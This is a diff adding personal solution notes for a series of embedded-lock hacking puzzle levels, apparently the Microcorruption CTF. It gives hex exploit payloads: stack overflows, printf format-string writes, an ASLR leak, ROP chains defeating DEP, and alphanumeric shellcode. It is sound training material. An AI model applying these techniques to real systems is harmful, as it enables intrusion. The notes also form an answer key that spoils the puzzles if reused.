@@ -1,0 +1,438 @@
+
+Level Summary:
+----------------------------------------------------------------------
+
+Tutorial
+New Orleans     : a.01, no hw security module
+Sydney          : a.02, no hw security module
+Hanoi           : b.01, HSM-1
+Cusco           : b.02, HSM-1
+
+Reykjavik       : a.03, no hw security module, encryption
+Whitehorse      : c.01, HSM-2
+Montevideo      : c.03, HSM-2
+Johannesburg    : b.04, HSM-1
+Santa Cruz      : b.05, HSM-1
+Jakarta         : b.06, HSM-1
+Addis Ababa     : b.03, HSM-1 -- printf
+Novosibirsk     : c.02, HSM-2 -- printf
+Algiers         : d.01
+Vladivostok     : c.05, HSM-2, aslr -- leak via printf, then reuse
+Bangalore       : e.01, HSM-2, memory protection
+Lagos           : c.04, HSM-2, alphanumeric passwords only -- solved!!
+Chernobyl       : d.02 -- HERE NEXT (but review Algiers first!)
+Hollywood
+Vancouver       : LockIT 2, rev a.01  (done out of turn)
+Baku
+Halifax
+St. John's
+Churchill
+Cold Lake
+
+
+----------------------------------------------------------------------
+Tutorial
+Any 8 char password
+solve: 12345678
+
+----------------------------------------------------------------------
+New Orleans
+Password directly embedded in memory.
+solve: &r1y(bs
+
+----------------------------------------------------------------------
+Sydney
+Password embedded in memory via cmp instruction.
+solve: u)Xr(Oz,
+
+----------------------------------------------------------------------
+Hanoi
+Exploit: overwrite flag with 'T' at memory address 2400
+Use PW of 17 letters. Any 16 followed by T.
+solve: AAAAAAAAAAAAAAAAT
+
+----------------------------------------------------------------------
+Cusco
+Exploit: overwrite return address at memory address 434e
+So after failed PW-test, and "not correct" message is printed
+Control is directed as we choose.
+We choose <unlock_door> at 4446, conveniently ascii "FD"
+solve: AAAAAAAAAAAAAAAAFD
+
+----------------------------------------------------------------------
+Reykjavik
+Confused by single letter passwords. Step to find magic value.
+solve(H): 0444
+
+----------------------------------------------------------------------
+Whitehorse
+Passwords longer that 16 chars can overwrite stack and take control
+after <conditional_unlock_door> has failed.
+There is no nice <unlock_door> to call.
+So instead we call <INT> at 4532, supplying code 7f
+tucked under where the return address is expected.
+16x "A", 3245, "AA", 7f
+solve(H): 41414141414141414141414141414141324541417f
+
+----------------------------------------------------------------------
+Montevideo
+Very similar to Whitehorse. Long passwords control the stack.
+Despite being initially allocated off stack. They are copied on stack.
+Again we divert control to <INT> at 454c, passing args as required.
+16x "A", 4c45, "AA", 7f
+solve(H): 414141414141414141414141414141414c4541417f
+
+
+----------------------------------------------------------------------
+Johannesburg
+TODO: explain
+17x "x", be, 9445, "xx" 7f
+solve: 7878787878787878787878787878787878be944578787f
+
+
+----------------------------------------------------------------------
+Santa Cruz
+TODO: explain
+
+user(hex): 17x78, 01, 24x78, 4a44
+pass(lit): 17x "y"
+
+solve1(H): 7878787878787878787878787878787878017878787878787878787878787878787878787878787878784a44
+solve2: yyyyyyyyyyyyyyyyy
+
+
+----------------------------------------------------------------------
+Jakarta
+TODO: explain
+
+solve1: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+solve2(H): 797979794c4477777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777
+
+
+----------------------------------------------------------------------
+Addis Ababa
+First printf exploit
+
+Entry of 20 chars is accepted, and passed to printf.
+%s %x %n do interersting things, using what comes next on the stack.
+
+Which are: a zero word (two zero bytes) (at 3822),
+And then the format string itself (from 3824)
+
+The zero word is a flag we want to alter to be non zero.
+
+"8 is conveniently the ascci for 3822 in little-endian order
+we then have two % modifiers in the format string. %x then %n
+%x converts (and skips) the next word on the stack (0000 at 3822)
+%n writes to the address pointed at by the next word on the stack
+The next word on stack (at 3824) is the first word of our format string
+Which is "8 or 3822, and so we write into this address.
+(We write 2 the number of chars so far printed)
+And then we are done!
+
+2238 2578 256e
+
+solve: "8%x%n
+solve(H): 22382578256e
+
+Aside: exploring %s
+Address 44e6 has the static text for the login prompt.
+Lets try to print that!
+We first need to skip over the zero word with %n, so... e644 %x %s
+or: e644 2578 2573
+this: e64425782573
+YES
+
+
+----------------------------------------------------------------------
+Novosibirsk
+Another printf exploit!
+
+We overwrite the 7e in a push-literal instruction at 44c8
+changing a <conditional_unlock_door> to <unlock_door>
+
+So the format string payload starts with the target address
+In little-endian order, c844.
+Then 125 random chars (here I use "w", 77)
+Then "%n" (256e)
+
+So alltogether: c844, 125x "w", "%n"
+
+solve(H): c8447777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777256e
+
+Lets explore making a shorter exploit...
+
+Aside: play with writing near start of mem.
+must pick address without 0-bytes
+lets choose 0102
+
+0201, 3x "w", %n
+0201777777256e
+-YES
+
+Now, lets try to use %s to point to an existing place in memory
+to print chars, and I hope these get counted for the %n modifier.
+The %s will have to point somewhere 0-terminated
+AH, at the top of memory we have some suitable data.
+Say from ff80.. there are 126 chars before the null, so...
+
+80ff, 0201, %s, %n
+80ff 0201 2573 256e
+80ff02012573256e
+
+126 + 4 (for the two address words) is 130, or 82 in hex
+And YES, indeed we see 82 at 0102
+
+
+Ok. So, can we make a short exploit which solves the level...
+
+We want to write 7f (127 decimal) to 44c8
+so lets use %s to point to 123 chars of data.
+So -3 w.r.t prev example. So +3 to high-mem address, giving ff83
+Giving solution in just 8 bytes.
+
+83ff, c844, %s %n
+83ff c844 2573 256e
+
+solve(H): 83ffc8442573256e
+
+
+Open question: What happens if we point at a place in memory with %s
+and we encounter further % modifiers. Are these converted?
+(be so cool if they were!)
+
+
+Explore by constructing a format string containing %s, and then point at self.
+0224, AAAA%sAAAA
+0224 41414141 2573 41414141
+022441414141257341414141
+- prints ..  AAAAAAAA%sAAAAAAAA
+- so we see the nested %s is not converted. oh well :(
+
+
+Reading blog on this level...
+
+solve(H): d644256e1e530e12b0123645
+overwrites a pop instruction in the <conditional_unlock_door>
+The instruction is overwritten with: 0200 == "rrc sr"
+(which in this case does nothing)
+But the control flow then goes haywire.
+Eventually landing back in the stack, which contains the format string
+The tail: 1e530e12b0123645
+dissasembles as:
+
+1e53           inc  r14
+0e12           push r14
+b012 3645      call #0x4536
+
+r14 contains 7e
+which we increment, and push on stack as arg for <INT> which we call.
+
+
+The lninked reditt thread discusses a 5 byte solution
+This will be interesting...
+
+So.. the essense seems to be to write the 0200 somewhere else
+This "rrc sr" will cancel the effect of where it ss written.
+
+Turns out cancelling instruction at address 4552, which is 0312 (push-literal 0)
+causes a change in the next instruction
+which loads r15 from the stack
+to get 7f instead of 0
+hence turning this putchar into an unlock!
+
+5245, %n, 7f
+solve(H): 5245256e7f
+
+And this all happens before the printf even returns
+Because it is the printf calling putchar on the 5th char 7f
+Which gets subverted to be the unlock. wow.
+
+
+
+
+----------------------------------------------------------------------
+Algiers
+TODO: explain
+
+any non-empty input at prompt2
+
+solve1(H): 7878787878787878787878787878787804126245
+solve2(H): xx
+
+
+----------------------------------------------------------------------
+Vancouver -- done out of turn
+TODO: explain
+
+solve(H): 7878783f407f000f123f4000000f123f40a8440f123041
+
+
+----------------------------------------------------------------------
+Vladivostok
+
+username: %n%n
+
+leaks address of printf
+we can compute the shift factor from original address at 476a
+then apply that shift to 453e to get target address, so...
+
+target = leaked - 476a + 453e
+target = leaked - 022c
+
+then enter for password: 6x anything, 7f00, target-in-little-endian-form
+
+password: 6x "A", 7f00, <target-little-endian>
+
+password: 414141414141 7f00 <target-little-endian>
+
+solve... 8bf0 is leaked.
+so target = 8bf0 - 22c --> 89c4
+
+password: 4141414141417f00c489
+
+YES YES, FINALLY
+
+
+----------------------------------------------------------------------
+Bangalore
+e.01, HSM-2, memory protection
+
+
+What are the codes to control this?...
+
+INT 0x10.
+Turn on DEP: pages are either executable or writable but never both.
+Takes no arguments.
+
+INT 0x11.
+Mark as a page as either only executable or only writable.
+Takes two one arguments. The first argument is the page number, the
+second argument is 1 if writable, 0 if executable.
+
+input...
+16 char password (ignored)
+then allows another 32 chars for the exploit payload.
+
+lives on stack, at fixed location: payload starts: 3ffe
+first word needs to be address to jump to. say next address: 4000
+
+
+step1...
+16x junk-char, followed by sequence of gadgets
+44de -- set_up_protection -- to get FF in r15 and r14
+4478 x5 -- drop some words of the stack
+452a -- within login, just before call to getsn, but n=255 !
+
+
+77777777777777777777777777777777
+de44
+7844
+7844
+7844
+7844
+7844
+2a45
+
+
+step2...
+16x junk-char again
+4498 (4100) -- pop 41 into r11
+44f6 - middle of set_up_protection, marking executable all pages from 41 onwards
+1 junk word (popped into r11)
+4100 - code written on stack, page 41, now executable
+(lots of padding to reach 4100)
+where we have:
+3240 00ff      "mov  #0xff00, sr"
+b012 1000      "call #0x10"
+
+
+77777777777777774141414142424242
+9844 4100
+f644
+7777 -- junk
+0041 -- return to code at end of stack
+7777
+7777
+7777
+7777
+777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777
+324000ffb0121000
+
+
+solve: (2 prompts)...
+
+77777777777777777777777777777777de44784478447844784478442a45
+
+7777777777777777414141414242424298444100f644777700417777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777324000ffb0121000
+
+
+Making it shorter...
+
+8 bytes payload 'shell-code' to open the lock: "mov #0xff00, sr ; call #0x10"
+8 bytes junk "A"
+"ret" 44ba (args: page=3f, mode=0) -- middle of mark_page_executable
+"ret" 3fee -- start of my buffer (now marked as executable)
+
+3240 00ff b012 1000
+4141 4141 4141 4141
+ba44 3f00 0000
+ee3f
+
+3240 00ff b012 1000 4141414141414141 ba44 3f00 0000 ee3f
+
+(spaces are stripped on entry!)
+
+
+----------------------------------------------------------------------
+Lagos
+c.04, HSM-2, alphanumeric passwords only
+
+goal: r9 = 460e (address contains callgate: 0x0010), compute as: 794f - 3341
+goal: sr = ff00, compute as 4444 + 4444 + 4444 + 3233  (+1 in carry)
+
+code for the two calculations takes constants via @sp, then jumps via @r9
+
+add @sp+, r9
+subc @sp+, r9
+add @sp+, sr
+add @sp+, sr
+add @sp+, sr
+add @sp+, sr
+mov @r9+, pc
+
+--> 3951 3971 3251 3251 3251 3251 3049
+
+17x "A"
+payload-start-addr = 4430
+6 constant words for the two calculations
+fill 36x "B"
+7 code words
+
+4141414141414141414141414141414141 3044
+4f79 4133
+4444 4444 4444 3332
+424242424242424242424242424242424242424242424242424242424242424242424242
+3951 3971
+3251 3251 3251 3251
+3049
+
+4141414141414141414141414141414141 3044 4f79 4133 4444 4444 4444 3332 424242424242424242424242424242424242424242424242424242424242424242424242 3951 3971 3251 3251 3251 3251 3049
+
+solve(ascii): AAAAAAAAAAAAAAAAA0DOyA3DDDDDD32BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB9Q9q2Q2Q2Q2Q0I
+
+
+
+(Now I can read blogs.. find techniques to be shorter/simpler!)
+
+
+----------------------------------------------------------------------
+Chernobyl
+d.02 -- HERE NEXT (but review Algiers first!)
+
+
+
+access AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE 11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
+
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
